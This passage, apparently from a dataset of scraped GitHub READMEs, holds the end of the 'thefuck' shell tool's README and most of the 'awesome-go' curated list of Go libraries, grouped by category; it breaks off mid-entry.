instant mode, add --enable-experimental-instant-mode\nto the alias initialization in .bashrc, .bash_profile or .zshrc.\nFor example:\neval $(thefuck --alias --enable-experimental-instant-mode)\nDeveloping\nSee CONTRIBUTING.md\nLicense MIT\nProject License can be found here."}, {"title": "avelino/awesome-go", "language": "Go", "content": "Awesome Go\n   \n financial support to Awesome Go\nA curated list of awesome Go frameworks, libraries and software. Inspired by awesome-python.\nContributing\nPlease take a quick gander at the contribution guidelines first. Thanks to all contributors; you rock!\nIf you see a package or project here that is no longer maintained or is not a good fit, please submit a pull request to improve this file. Thank you!\nContents\n\n\nAwesome Go\n\nAudio and Music\nAuthentication and OAuth\nBot Building\nCommand Line\nConfiguration\nContinuous Integration\nCSS Preprocessors\nData Structures\nDatabase\nDatabase Drivers\nDate and Time\nDistributed Systems\nEmail\nEmbeddable Scripting Languages\nError Handling\nFiles\nFinancial\nForms\nFunctional\nGame Development\nGeneration and Generics\nGeographic\nGo Compilers\nGoroutines\nGUI\nHardware\nImages\nIoT\nJob Scheduler\nJSON\nLogging\nMachine Learning\nMessaging\nMicrosoft Office\n\nMicrosoft Excel\n\n\nMiscellaneous\n\nDependency Injection\nProject Layout\nStrings\n\n\nNatural Language Processing\nNetworking\n\nHTTP Clients\n\n\nOpenGL\nORM\nPackage Management\nQuery Language\nResource Embedding\nScience and Data Analysis\nSecurity\nSerialization\nTemplate Engines\nTesting\nText Processing\nThird-party APIs\nUtilities\nUUID\nValidation\nVersion Control\nVideo\nWeb Frameworks\n\nMiddlewares\n\nActual middlewares\nLibraries for creating HTTP middlewares\n\n\nRouters\n\n\nWindows\nXML\n\n\n\nTools\n\nCode Analysis\nEditor Plugins\nGo Generate Tools\nGo Tools\nSoftware Packages\n\nDevOps Tools\nOther Software\n\n\n\n\n\nServer Applications\n\n\nResources\n\nBenchmarks\nConferences\nE-Books\nGophers\nMeetups\nTwitter\nWebsites\n\nTutorials\n\n\n\n\n\nAudio and Music\nLibraries for manipulating audio.\n\nEasyMIDI - EasyMidi is a simple and reliable library for working with standard midi file (SMF).\nflac - No-frills native Go FLAC decoder that decodes FLAC files into byte slices.\nflac - Native Go FLAC encoder/decoder with support for FLAC streams.\ngaad - Native Go AAC bitstream parser.\ngo-sox - libsox bindings for go.\ngo_mediainfo - libmediainfo bindings for go.\ngosamplerate - libsamplerate bindings for go.\nid3v2 - Fast and stable ID3 parsing and writing library for Go.\nmalgo - Mini audio library.\nminimp3 - Lightweight MP3 decoder library.\nmix - Sequence-based Go-native audio mixer for music apps.\nmp3 - Native Go MP3 decoder.\nmusic-theory - Music theory models in Go.\nOto - A low-level library to play sound on multiple platforms.\nPortAudio - Go bindings for the PortAudio audio I/O library.\nportmidi - Go bindings for PortMidi.\ntaglib - Go bindings for taglib.\nvorbis - \"Native\" Go Vorbis decoder (uses CGO, but has no dependencies).\nwaveform - Go package capable of generating waveform images from audio streams.\n\nAuthentication and OAuth\nLibraries for implementing authentications schemes.\n\nauthboss - Modular authentication system for the web. It tries to remove as much boilerplate and \"hard things\" as possible so that each time you start a new web project in Go, you can plug it in, configure, and start building your app without having to build an authentication system each time.\nbranca - Golang implementation of Branca Tokens.\ncasbin - Authorization library that supports access control models like ACL, RBAC, ABAC.\ncookiestxt - provides parser of cookies.txt file format.\ngo-jose - Fairly complete implementation of the JOSE working group's JSON Web Token, JSON Web Signatures, and JSON Web Encryption specs.\ngo-oauth2-server - Standalone, specification-compliant,  OAuth2 server written in Golang.\ngologin - chainable handlers for login with OAuth1 and OAuth2 authentication providers.\ngorbac - provides a lightweight role-based access control (RBAC) implementation in Golang.\ngoth - provides a simple, clean, and idiomatic way to use OAuth and OAuth2. Handles multiple providers out of the box.\nhttpauth - HTTP Authentication middleware.\njwt - Clean and easy to use implementation of JSON Web Tokens (JWT).\njwt - Lightweight JSON Web Token (JWT) library.\njwt-auth - JWT middleware for Golang http servers with many configuration options.\njwt-go - Golang implementation of JSON Web Tokens (JWT).\nloginsrv - JWT login microservice with plugable backends such as OAuth2 (Github), htpasswd, osiam.\noauth2 - Successor of goauth2. Generic OAuth 2.0 package that comes with JWT, Google APIs, Compute Engine and App Engine support.\nosin - Golang OAuth2 server library.\npaseto - Golang implementation of Platform-Agnostic Security Tokens (PASETO).\npermissions2 - Library for keeping track of users, login states and permissions. Uses secure cookies and bcrypt.\nrbac - Minimalistic RBAC package for Go applications.\nsecurecookie - Efficient secure cookie encoding/decoding.\nsession - Go session management for web servers (including support for Google App Engine - GAE).\nsessiongate-go - Go session management using the SessionGate Redis module.\nsessions - Dead simple, highly performant, highly customizable sessions service for go http servers.\nsignedvalue - Signed and timestamped strings compatible with Tornado's create_signed_value, decode_signed_value, and therefore set_secure_cookie and get_secure_cookie.\n\nBot Building\nLibraries for building and working with bots.\n\ngo-chat-bot - IRC, Slack & Telegram bot written in Go.\ngo-sarah - Framework to build bot for desired chat services including LINE, Slack, Gitter and more.\ngo-tgbot - Pure Golang Telegram Bot API wrapper, generated from swagger file, session-based router and middleware.\nGolang CryptoTrading Bot - A golang implementation of a console-based trading bot for cryptocurrency exchanges.\ngovkbot - Simple Go VK bot library.\nhanu - Framework for writing Slack bots.\nKelp - official trading and market-making bot for the Stellar DEX. Works out-of-the-box, written in Golang, compatible with centralized exchanges and custom trading strategies.\nmargelet - Framework for building Telegram bots.\nmicha - Go Library for Telegram bot api.\nslacker - Easy to use framework to create Slack bots.\ntbot - Telegram bot server with API similar to net/http.\ntelebot - Telegram bot framework written in Go.\ntelegram-bot-api - Simple and clean Telegram bot client.\nTenyks - Service oriented IRC bot using Redis and JSON for messaging.\n\nCommand Line\nStandard CLI\nLibraries for building standard or basic Command Line applications.\n\nargparse - Command line argument parser inspired by Python's argparse module.\nargv - Go library to split command line string as arguments array using the bash syntax.\ncli - Feature-rich and easy to use command-line package based on golang struct tags.\ncli - Simple and complete API for building command line interfaces in Go.\ncli-init - The easy way to start building Golang command line applications.\nclimax - Alternative CLI with \"human face\", in spirit of Go command.\ncobra - Commander for modern Go CLI interactions.\ncommandeer - Dev-friendly CLI apps: sets up flags, defaults, and usage based on struct fields and tags.\ncomplete - Write bash completions in Go + Go command bash completion.\ndocopt.go - Command-line arguments parser that will make you smile.\nenv - Tag-based environment configuration for structs.\nflag - Simple but powerful command line option parsing library for Go supporting subcommand.\nflaggy - A robust and idiomatic flags package with excellent subcommand support.\nflagvar - A collection of flag argument types for Go's standard flag package.\ngo-arg - Struct-based argument parsing in Go.\ngo-commander - Go library to simplify CLI workflow.\ngo-flags - go command line option parser.\ngo-getoptions - Go option parser inspired on the flexibility of Perl\u2019s GetOpt::Long.\ngocmd - Go library for building command line applications.\nhiboot cli - cli application framework with auto configuration and dependency injection.\nkingpin - Command line and flag parser supporting sub commands.\nliner - Go readline-like library for command-line interfaces.\nmitchellh/cli - Go library for implementing command-line interfaces.\nmow.cli - Go library for building CLI applications with sophisticated flag and argument parsing and validation.\npflag - Drop-in replacement for Go's flag package, implementing POSIX/GNU-style --flags.\nreadline - Pure golang implementation that provides most features in GNU-Readline under MIT license.\nsand - Simple API for creating interpreters and so much more.\nsflags - Struct based flags generator for flag, urfave/cli, pflag, cobra, kingpin and other libraries.\nstrumt - Library to create prompt chain.\nukautz/clif - Small command line interface framework.\nurfave/cli - Simple, fast, and fun package for building command line apps in Go (formerly codegangsta/cli).\nwlog - Simple logging interface that supports cross-platform color and concurrency.\nwmenu - Easy to use menu structure for cli applications that prompts users to make choices.\n\nAdvanced Console UIs\nLibraries for building Console Applications and Console User Interfaces.\n\nasciigraph - Go package to make lightweight ASCII line graph \u256d\u2508\u256f in command line apps with no other dependencies.\naurora - ANSI terminal colors that supports fmt.Printf/Sprintf.\ncfmt - Contextual fmt inspired by bootstrap color classes.\nchalk - Intuitive package for prettifying terminal/console output.\ncolor - Versatile package for colored terminal output.\ncolourize - Go library for ANSI colour text in terminals.\nctc - The non-invasive cross-platform terminal color library does not need to modify the Print method.\ngo-ataman - Go library for rendering ANSI colored text templates in terminals.\ngo-colorable - Colorable writer for windows.\ngo-colortext - Go library for color output in terminals.\ngo-isatty - isatty for golang.\ngo-prompt - Library for building a powerful interactive prompt, inspired by python-prompt-toolkit.\ngocui - Minimalist Go library aimed at creating Console User Interfaces.\ngommon/color - Style terminal text.\ngookit/color - Terminal color rendering tool library, support 16 colors, 256 colors, RGB color rendering output, compatible with Windows.\nmpb - Multi progress bar for terminal applications.\nprogressbar - Basic thread-safe progress bar that works in every OS.\nsimpletable - Simple tables in terminal with Go.\ntabby - A tiny library for super simple Golang tables.\ntabular - Print ASCII tables from command line utilities without the need to pass large sets of data to the API.\ntermbox-go - Termbox is a library for creating cross-platform text-based interfaces.\ntermdash - Go terminal dashboard based on termbox-go and inspired by termui.\ntermtables - Go port of the Ruby library terminal-tables for simple ASCII table generation as well as providing markdown and HTML output.\ntermui - Go terminal dashboard based on termbox-go and inspired by blessed-contrib.\nuilive - Library for updating terminal output in realtime.\nuiprogress - Flexible library to render progress bars in terminal applications.\nuitable - Library to improve readability in terminal apps using tabular data.\n\nConfiguration\nLibraries for configuration parsing.\n\nconfig - Cloud native application configuration. Bind ENV to structs in only two lines.\nconfig - JSON or YAML configuration wrapper with environment variables and flags parsing.\nconfigure - Provides configuration through multiple sources, including JSON, flags and environment variables.\nconfita - Load configuration in cascade from multiple backends into a struct.\nconflate - Library/tool to merge multiple JSON/YAML/TOML files from arbitrary URLs, validation against a JSON schema, and application of default values defined in the schema.\nenv - Parse environment variables to Go structs (with defaults).\nenvcfg - Un-marshaling environment variables to Go structs.\nenvconf - Configuration from environment.\nenvconfig - Read your configuration from environment variables.\nenvh - Helpers to manage environment variables.\ngcfg - read INI-style configuration files into Go structs; supports user-defined types and subsections.\ngo-up - A simple configuration library with recursive placeholders resolution and no magic.\ngoConfig - Parses a struct as input and populates the fields of this struct with parameters from command line, environment variables and configuration file.\ngodotenv - Go port of Ruby's dotenv library (Loads environment variables from .env).\ngofigure - Go application configuration made easy.\ngone/jconf - Modular JSON configuration. Keep you config structs along with the code they configure and delegate parsing to submodules without sacrificing full config serialization.\ngookit/config - application config manage(load,get,set). support JSON, YAML, TOML, INI, HCL. multi file load, data override merge.\nhjson - Human JSON, a configuration file format for humans. Relaxed syntax, fewer mistakes, more comments.\ningo - Flags persisted in an ini-like config file.\nini - Go package to read and write INI files.\njoshbetz/config - Small configuration library for Go that parses environment variables, JSON files, and reloads automatically on SIGHUP.\nkelseyhightower/envconfig - Go library for managing configuration data from environment variables.\nmini - Golang package for parsing ini-style configuration files.\nsprbox - Build-environment aware toolbox factory and agnostic config parser (YAML, TOML, JSON and Environment vars).\nstore - Lightweight configuration manager for Go.\nviper - Go configuration with fangs.\nxdg - Cross platform package that follows the XDG Standard.\n\nContinuous Integration\nTools for help with continuous integration.\n\ndrone - Drone is a Continuous Integration platform built on Docker, written in Go.\nduci - A simple ci server no needs domain specific languages.\ngomason - Test, Build, Sign, and Publish your go binaries from a clean workspace.\ngoveralls - Go integration for Coveralls.io continuous code coverage tracking system.\noveralls - Multi-Package go project coverprofile for tools like goveralls.\nroveralls - Recursive coverage testing tool.\n\nCSS Preprocessors\nLibraries for preprocessing CSS files.\n\ngcss - Pure Go CSS Preprocessor.\ngo-libsass - Go wrapper to the 100% Sass compatible libsass project.\n\nData Structures\nGeneric datastructures and algorithms in Go.\n\nalgorithms - Algorithms and data structures.CLRS study.\nbinpacker - Binary packer and unpacker helps user build custom binary stream.\nbit - Golang set data structure with bonus bit-twiddling functions.\nbitset - Go package implementing bitsets.\nbloom - Bloom filters implemented in Go.\nbloom - Golang Bloom filter implementation.\nboomfilters - Probabilistic data structures for processing continuous, unbounded streams.\nconcurrent-writer - Highly concurrent drop-in replacement for bufio.Writer.\nconjungo - A small, powerful and flexible merge library.\ncount-min-log - Go implementation Count-Min-Log sketch: Approximately counting with approximate counters (Like Count-Min sketch but using less memory).\ncrunch - Go package implementing buffers for handling various datatypes easily.\ncuckoofilter - Cuckoo filter: a good alternative to a counting bloom filter implemented in Go.\ndeque - A highly optimized double-ended queue.\ndeque - Fast ring-buffer deque (double-ended queue).\ndict - Python-like dictionaries (dict) for Go.\nencoding - Integer Compression Libraries for Go.\ngo-adaptive-radix-tree - Go implementation of Adaptive Radix Tree.\ngo-datastructures - Collection of useful, performant, and thread-safe data structures.\ngo-ef - A Go implementation of the Elias-Fano encoding.\ngo-geoindex - In-memory geo index.\ngo-mcache - Fast in-memory key:value store/cache library. Pointer caches.\ngo-rquad - Region quadtrees with efficient point location and neighbour finding.\ngoconcurrentqueue - Concurrent FIFO queue.\ngods - Go Data Structures. Containers, Sets, Lists, Stacks, Maps, BidiMaps, Trees, HashSet etc.\ngolang-set - Thread-Safe and Non-Thread-Safe high-performance sets for Go.\ngoset - A useful Set collection implementation for Go.\ngoskiplist - Skip list implementation in Go.\ngota - Implementation of dataframes, series, and data wrangling methods for Go.\nhide - ID type with marshalling to/from hash to prevent sending IDs to clients.\nhilbert - Go package for mapping values to and from space-filling curves, such as Hilbert and Peano curves.\nhyperloglog - HyperLogLog implementation with Sparse, LogLog-Beta bias correction and TailCut space reduction.\nlevenshtein - Levenshtein distance and similarity metrics with customizable edit costs and Winkler-like bonus for common prefix.\nlevenshtein - Implementation to calculate levenshtein distance in Go.\nmafsa - MA-FSA implementation with Minimal Perfect Hashing.\nmerkletree - Implementation of a merkle tree providing an efficient and secure verification of the contents of data structures.\nmspm - Multi-String Pattern Matching Algorithm for information retrieval.\nnull - Nullable Go types that can be marshalled/unmarshalled to/from JSON.\npipeline - An implementation of pipelines with fan-in and fan-out.\nring - Go implementation of a high performance, thread safe bloom filter.\nroaring - Go package implementing compressed bitsets.\nset - Simple set data structure implementation in Go using LinkedHashMap.\nskiplist - Very fast Go Skiplist implementation.\nskiplist - Skiplist implementation in Go.\ntimedmap - Map with expiring key-value pairs.\ntreap - Persistent, fast ordered map using tree heaps.\ntrie - Trie implementation in Go.\nttlcache - In-memory LRU string-interface{} map with expiration for golang.\ntyp - Null Types, Safe primitive type conversion and fetching value from complex structures.\nwillf/bloom - Go package implementing Bloom filters.\n\nDatabase\nDatabases implemented in Go.\n\nbadger - Fast key-value store in Go.\nbcache - Eventually consistent distributed in-memory  cache Go library.\nBigCache - Efficient key/value cache for gigabytes of data.\nbolt - Low-level key/value database for Go.\nbuntdb - Fast, embeddable, in-memory key/value database for Go with custom indexing and spatial support.\ncache2go - In-memory key:value cache which supports automatic invalidation based on timeouts.\nclusteredBigCache - BigCache with clustering support and individual item expiration.\ncockroach - Scalable, Geo-Replicated, Transactional Datastore.\ncouchcache - RESTful caching micro-service backed by Couchbase server.\nCovenantSQL - CovenantSQL is a SQL database on blockchain.\ndgraph - Scalable, Distributed, Low Latency, High Throughput Graph Database.\ndiskv - Home-grown disk-backed key-value store.\neliasdb - Dependency-free, transactional graph database with REST API, phrase search and SQL-like query language.\nfastcache - fast thread-safe inmemory cache for big number of entries. Minimizes GC overhead.\nGCache - Cache library with support for expirable Cache, LFU, LRU and ARC.\ngo-cache - In-memory key:value store/cache (similar to Memcached) library for Go, suitable for single-machine applications.\ngoleveldb - Implementation of the LevelDB key/value database in Go.\ngorocksdb - Gorocksdb is a wrapper for RocksDB written in Go.\ngroupcache - Groupcache is a caching and cache-filling library, intended as a replacement for memcached in many cases.\ninfluxdb - Scalable datastore for metrics, events, and real-time analytics.\nledisdb - Ledisdb is a high performance NoSQL like Redis based on LevelDB.\nlevigo - Levigo is a Go wrapper for LevelDB.\nmoss - Moss is a simple LSM key-value storage engine written in 100% Go.\nnutsdb - Nutsdb is a simple, fast, embeddable, persistent key/value store written in pure Go. It supports fully serializable transactions and many data structures such as  list, set, sorted set.\npiladb - Lightweight RESTful database engine based on stack data structures.\nprometheus - Monitoring system and time series database.\npudge - Fast and simple  key/value store written using Go's standard library.\nrqlite - The lightweight, distributed, relational database built on SQLite.\nScribble - Tiny flat file JSON store.\nslowpoke - Key-value store with persistence.\ntempdb - Key-value store for temporary items.\ntidb - TiDB is a distributed SQL database. Inspired by the design of Google F1.\ntiedot - Your NoSQL database powered by Golang.\nVasto - A distributed high-performance key-value store. On Disk. Eventual consistent. HA. Able to grow or shrink without service interruption.\n\nDatabase schema migration.\n\navro - Discover SQL schemas and convert them to AVRO schemas. Query SQL records into AVRO bytes.\ndarwin - Database schema evolution library for Go.\ngo-fixtures - Django style fixtures for Golang's excellent built-in database/sql library.\ngo-pg-migrations - A Go package to help write migrations with go-pg/pg.\ngondolier - Database migration library using struct decorators.\ngoose - Database migration tool. You can manage your database's evolution by creating incremental SQL or Go scripts.\ngormigrate - Database schema migration helper for Gorm ORM.\nmigrate - Database migrations. CLI and Golang library.\npravasan - Simple Migration tool - currently for MySQL but planning to soon support Postgres, SQLite, MongoDB, etc.\nsoda - Database migration, creation, ORM, etc... for MySQL, PostgreSQL, and SQLite.\nsql-migrate - Database migration tool. Allows embedding migrations into the application using go-bindata.\n\nDatabase tools.\n\nchproxy - HTTP proxy for ClickHouse database.\nclickhouse-bulk - Collects small insterts and sends big requests to ClickHouse servers.\ndbbench - Database benchmarking tool with support for several databases and scripts.\ngo-mysql - Go toolset to handle MySQL protocol and replication.\ngo-mysql-elasticsearch - Sync your MySQL data into Elasticsearch automatically.\nkingshard - kingshard is a high performance proxy for MySQL powered by Golang.\nmyreplication - MySql binary log replication listener. Supports statement and row based replication.\noctillery - Go package for sharding databases ( Supports every ORM or raw SQL ).\norchestrator - MySQL replication topology manager & visualizer.\npgweb - Web-based PostgreSQL database browser.\nprep - Use prepared SQL statements without changing your code.\npREST - Serve a RESTful API from any PostgreSQL database.\nrwdb - rwdb provides read replica capability for multiple database servers setup.\nvitess - vitess provides servers and tools which facilitate scaling of MySQL databases for large scale web services.\n\nSQL query builder, libraries for building and using SQL.\n\nDotsql - Go library that helps you keep sql files in one place and use them with ease.\ngendry - Non-invasive SQL builder and powerful data binder.\ngodbal - Database Abstraction Layer (dbal) for go. Support SQL builder and get result easily.\ngoqu - Idiomatic SQL builder and query library.\nigor - Abstraction layer for PostgreSQL that supports advanced functionality and uses gorm-like syntax.\normlite - Lightweight package containing some ORM-like features and helpers for sqlite databases.\nozzo-dbx - Powerful data retrieval methods as well as DB-agnostic query building capabilities.\nscaneo - Generate Go code to convert database rows into arbitrary structs.\nsqrl - SQL query builder, fork of Squirrel with improved performance.\nSqualus - Thin layer over the Go SQL package that makes it easier to perform queries.\nSquirrel - Go library that helps you build SQL queries.\nxo - Generate idiomatic Go code for databases based on existing schema definitions or custom queries supporting PostgreSQL, MySQL, SQLite, Oracle, and Microsoft SQL Server.\n\nDatabase Drivers\nLibraries for connecting and operating databases.\n\n\nRelational Databases\n\navatica - Apache Avatica/Phoenix SQL driver for database/sql.\nbgc - Datastore Connectivity for BigQuery for go.\nfirebirdsql - Firebird RDBMS SQL driver for Go.\ngo-adodb - Microsoft ActiveX Object DataBase driver for go that uses database/sql.\ngo-mssqldb - Microsoft MSSQL driver for Go.\ngo-oci8 - Oracle driver for go that uses database/sql.\ngo-sql-driver/mysql - MySQL driver for Go.\ngo-sqlite3 - SQLite3 driver for go that uses database/sql.\ngofreetds - Microsoft MSSQL driver. Go wrapper over FreeTDS.\ngoracle - Oracle driver for Go, using the ODPI-C driver.\npgx - PostgreSQL driver supporting features beyond those exposed by database/sql.\npq - Pure Go Postgres driver for database/sql.\n\n\n\nNoSQL Databases\n\naerospike-client-go - Aerospike client in Go language.\narangolite - Lightweight golang driver for ArangoDB.\nasc - Datastore Connectivity for Aerospike for go.\ndynago - Dynago is a principle of least surprise client for DynamoDB.\nforestdb - Go bindings for ForestDB.\ngo-couchbase - Couchbase client in Go.\ngo-couchdb - Yet another CouchDB HTTP API wrapper for Go.\ngo-pilosa - Go client library for Pilosa.\ngo-rejson - Golang client for redislabs' ReJSON module using Redigo golang client. Store and manipulate structs as JSON objects in redis with ease.\ngocb - Official Couchbase Go SDK.\ngocql - Go language driver for Apache Cassandra.\ngodscache - A wrapper for the Google Cloud Platform Go Datastore package that adds caching using memcached.\ngomemcache - memcache client library for the Go programming language.\ngorethink - Go language driver for RethinkDB.\ngoriak - Go language driver for Riak KV.\nmgo - MongoDB driver for the Go language that implements a rich and well tested selection of features under a very simple API following standard Go idioms.\nmongo-go-driver - Official MongoDB driver for the Go language.\nneo4j - Neo4j Rest API Bindings for Golang.\nNeo4j-GO - Neo4j REST Client in golang.\nneoism - Neo4j client for Golang.\nredigo - Redigo is a Go client for the Redis database.\nredis - Redis client for Golang.\nredis - Redis-protocol compatible TCP servers/services.\nxredis - Typesafe, customizable, clean & easy to use Redis client.\n\n\n\nSearch and Analytic Databases.\n\nbleve - Modern text indexing library for go.\nelastic - Elasticsearch client for Go.\nelasticsql - Convert sql to elasticsearch dsl in Go.\nelastigo - Elasticsearch client library.\ngo-elasticsearch - Official Elasticsearch client for Go.\ngoes - Library to interact with Elasticsearch.\nriot - Go Open Source, Distributed, Simple and efficient Search Engine.\nskizze - probabilistic data-structures service and storage.\n\n\n\nMultiple Backends.\n\ncachego - Golang Cache component for multiple drivers.\ncayley - Graph database with support for multiple backends.\ndsc - Datastore connectivity for SQL, NoSQL, structured files.\ngokv - Simple key-value store abstraction and implementations for Go (Redis, Consul, etcd, bbolt, BadgerDB, LevelDB, Memcached, DynamoDB, S3, PostgreSQL, MongoDB, CockroachDB and many more).\n\n\n\nDate and Time\nLibraries for working with dates and times.\n\ncarbon - Simple Time extension with a lot of util methods, ported from PHP Carbon library.\ndate - Augments Time for working with dates, date ranges, time spans, periods, and time-of-day.\ndateparse - Parse date's without knowing format in advance.\ndurafmt - Time duration formatting library for Go.\nfeiertage - Set of functions to calculate public holidays in Germany, incl. specialization on the states of Germany (Bundesl\u00e4nder). Things like Easter, Pentecost, Thanksgiving...\ngo-persian-calendar - The implementation of the Persian (Solar Hijri) Calendar in Go (golang).\ngo-sunrise - Calculate the sunrise and sunset times for a given location.\ngoweek - Library for working with week entity in golang.\niso8601 - Efficiently parse ISO8601 date-times without regex.\nkair - Date and Time - Golang Formatting Library.\nnow - Now is a time toolkit for golang.\nNullTime - Nullable time.Time.\nstrftime - C99-compatible strftime formatter.\ntimespan - For interacting with intervals of time, defined as a start time and a duration.\ntimeutil - Useful extensions (Timedelta, Strftime, ...) to the golang's time package.\ntuesday - Ruby-compatible Strftime function.\n\nDistributed Systems\nPackages that help with building Distributed Systems.\n\nceleriac - Library for adding support for interacting and monitoring Celery workers, tasks and events in Go.\nconsistent - Consistent hashing with bounded loads.\ndht - BitTorrent Kademlia DHT implementation.\ndigota - grpc ecommerce microservice.\ndot - distributed sync using operational transformation/OT.\ndoublejump - A revamped Google's jump consistent hash.\ndrmaa - Job submission library for cluster schedulers based on the DRMAA standard.\ndynamolock - DynamoDB-backed distributed locking implementation.\ndynatomic - A library for using DynamoDB as an atomic counter.\nemitter-io - High performance, distributed, secure and low latency publish-subscribe platform built with MQTT, Websockets and love.\nflowgraph - flow-based programming package.\ngleam - Fast and scalable distributed map/reduce system written in pure Go and Luajit, combining Go's high concurrency with Luajit's high performance, runs standalone or distributed.\nglow - Easy-to-Use scalable distributed big data processing, Map-Reduce, DAG execution, all in pure Go.\ngo-health - Library for enabling asynchronous dependency health checks in your service.\ngo-jump - Port of Google's \"Jump\" Consistent Hash function.\ngo-kit - Microservice toolkit with support for service discovery, load balancing, pluggable transports, request tracking, etc.\ngorpc - Simple, fast and scalable RPC library for high load.\ngrpc-go - The Go language implementation of gRPC. HTTP/2 based RPC.\nhprose - Very newbility RPC Library, support 25+ languages now.\njaeger - A distributed tracing system.\njsonrpc - The jsonrpc package helps implement of JSON-RPC 2.0.\njsonrpc - JSON-RPC 2.0 HTTP client implementation.\nKrakenD - Ultra performant API Gateway framework with middlewares.\nmicro - Pluggable microservice toolkit and distributed systems platform.\nNATS - Lightweight, high performance messaging system for microservices, IoT, and cloud native systems.\noutboxer - Outboxer is a go library that implements the outbox pattern.\npglock - PostgreSQL-backed distributed locking implementation.\nraft - Golang implementation of the Raft consensus protocol, by HashiCorp.\nraft - Go implementation of the Raft consensus protocol, by CoreOS.\nredis-lock - Simplified distributed locking implementation using Redis.\nresgate - An open-source Realtime API Gateway, compatible with REST and RPC APIs.\nringpop-go - Scalable, fault-tolerant application-layer sharding for Go applications.\nrpcx - Distributed pluggable RPC service framework like alibaba Dubbo.\nsleuth - Library for master-less p2p auto-discovery and RPC between HTTP services (using ZeroMQ).\ntendermint - High-performance middleware for transforming a state machine written in any programming language into a Byzantine Fault Tolerant replicated state machine using the Tendermint consensus and blockchain protocols.\ntorrent - BitTorrent client package.\n\nEmail\nLibraries and tools that implement email creation and sending.\n\nchasquid - SMTP server written in Go.\ndouceur - CSS inliner for your HTML emails.\nemail - A robust and flexible email library for Go.\ngo-dkim - DKIM library, to sign & verify email.\ngo-imap - IMAP library for clients and servers.\ngo-message - Streaming library for the Internet Message Format and mail messages.\ngo-premailer - Inline styling for HTML mail in Go.\nGomail - Gomail is a very simple and powerful package to send emails.\nHectane - Lightweight SMTP client providing an HTTP API.\nhermes - Golang package that generates clean, responsive HTML e-mails.\nMailHog - Email and SMTP testing with web and API interface.\nSendGrid - SendGrid's Go library for sending email.\nsmtp - SMTP server protocol state machine.\n\nEmbeddable Scripting Languages\nEmbedding other languages inside your go code.\n\nagora - Dynamically typed, embeddable programming language in Go.\nanko - Scriptable interpreter written in Go.\nbinder - Go to Lua binding library, based on gopher-lua.\nexpr - an engine that can evaluate expressions.\ngentee - Embeddable scripting programming language.\ngisp - Simple LISP in Go.\ngo-duktape - Duktape JavaScript engine bindings for Go.\ngo-lua - Port of the Lua 5.2 VM to pure Go.\ngo-php - PHP bindings for Go.\ngo-python - naive go bindings to the CPython C-API.\ngolua - Go bindings for Lua C API.\ngopher-lua - Lua 5.1 VM and compiler written in Go.\ngval - A highly customizable expression language written in Go.\nngaro - Embeddable Ngaro VM implementation enabling scripting in Retro.\notto - JavaScript interpreter written in Go.\npurl - Perl 5.18.2 embedded in Go.\ntengo - Bytecode compiled script language for Go.\n\nError Handling\nLibraries for handling errors.\n\nerrlog - Hackable package that determines responsible source code for an error (and some other fast-debugging features). Pluggable to any logger in-place.\nerrors - Package that provides simple error handling primitives.\nerrorx - A feature rich error package with stack traces, composition of errors and more.\ngo-multierror - Go (golang) package for representing a list of errors as a single error.\ntracerr - Golang errors with stack trace and source fragments.\nwerr - Error Wrapper creates an wrapper for the error type in Go which captures the File, Line and Stack of where it was called.\n\nFiles\nLibraries for handling files and file systems.\n\nafero - FileSystem Abstraction System for Go.\nflop - File operations library which aims to mirror feature parity with GNU cp.\ngo-csv-tag - Load csv file using tag.\ngo-decent-copy - Copy files for humans.\ngo-gtfs - Load gtfs files in go.\nnotify - File system event notification library with simple API, similar to os/signal.\nopc - Load Open Packaging Conventions (OPC) files for Go.\npdfcpu - PDF processor.\nskywalker - Package to allow one to concurrently go through a filesystem with ease.\nstl - Modules to read and write STL (stereolithography) files.  Concurrent algorithm for reading.\ntarfs - Implementation of the FileSystem interface for tar files.\nvfs - A pluggable, extensible, and opinionated set of filesystem functionality for Go across a number of filesystem types such as os, S3, and GCS.\n\nFinancial\nPackages for accounting and finance.\n\naccounting - money and currency formatting for golang.\ndecimal - Arbitrary-precision fixed-point decimal numbers.\ngo-finance - Comprehensive financial markets data in Go.\ngo-finance - Library of financial functions for time value of money (annuities), cash flow, interest rate conversions, bonds and depreciation calculations.\ngo-money - Implementation of Fowler's Money pattern.\nofxgo - Query OFX servers and/or parse the responses (with example command-line client).\norderbook - Matching Engine for Limit Order Book in Golang.\ntechan - Technical analysis library with advanced market analysis and trading strategies.\ntransaction - Embedded transactional database of accounts, running in multithreaded mode.\nvat - VAT number validation & EU VAT rates.\n\nForms\nLibraries for working with forms.\n\nbind - Bind form data to any Go values.\nbinding - Binds form and JSON data from net/http Request to struct.\nconform - Keeps user input in check. Trims, sanitizes & scrubs data based on struct tags.\nform - Decodes url.Values into Go value(s) and Encodes Go value(s) into url.Values. Dual Array and Full map support.\nformam - decode form's values into a struct.\nforms - Framework-agnostic library for parsing and validating form/JSON data which supports multipart forms and files.\ngorilla/csrf - CSRF protection for Go web applications & services.\nnosurf - CSRF protection middleware for Go.\n\nFunctional\nPackages to support functional programming in Go.\n\nfpGo - Monad, Functional Programming features for Golang.\nfuego - Functional Experiment in Go.\ngo-underscore - Useful collection of helpfully functional Go collection utilities.\n\nGame Development\nAwesome game development libraries.\n\nAzul3D - 3D game engine written in Go.\nEbiten - dead simple 2D game library in Go.\nengo - Engo is an open-source 2D game engine written in Go. It follows the Entity-Component-System paradigm.\ng3n - Go 3D Game Engine.\nGarageEngine - 2d game engine written in Go working on OpenGL.\nglop - Glop (Game Library Of Power) is a fairly simple cross-platform game library.\ngo-astar - Go implementation of the A* path finding algorithm.\ngo-collada - Go package for working with the Collada file format.\ngo-sdl2 - Go bindings for the Simple DirectMedia Layer.\ngo3d - Performance oriented 2D/3D math package for Go.\ngonet - Game server skeleton implemented with golang.\ngoworld - Scalable game server engine, featuring space-entity framework and hot-swapping.\nLeaf - Lightweight game server framework.\nnano - Lightweight, facility, high performance golang based game server framework.\nOak - Pure Go game engine.\nPitaya - Scalable game server framework with clustering support and client libraries for iOS, Android, Unity and others through the C SDK.\nPixel - Hand-crafted 2D game library in Go.\nraylib-go - Go bindings for raylib, a simple and easy-to-use library to learn videogames programming.\ntermloop - Terminal-based game engine for Go, built on top of Termbox.\n\nGeneration and Generics\nTools to enhance the language with features like generics via code generation.\n\nefaceconv - Code generation tool for high performance conversion from interface{} to immutable type without allocations.\ngen - Code generation tool for \u2018generics\u2019-like functionality.\ngo-enum - Code generation for enums from code comments.\ngo-linq - .NET LINQ-like query methods for Go.\ngoderive - Derives functions from input types.\ngotype - Golang source code 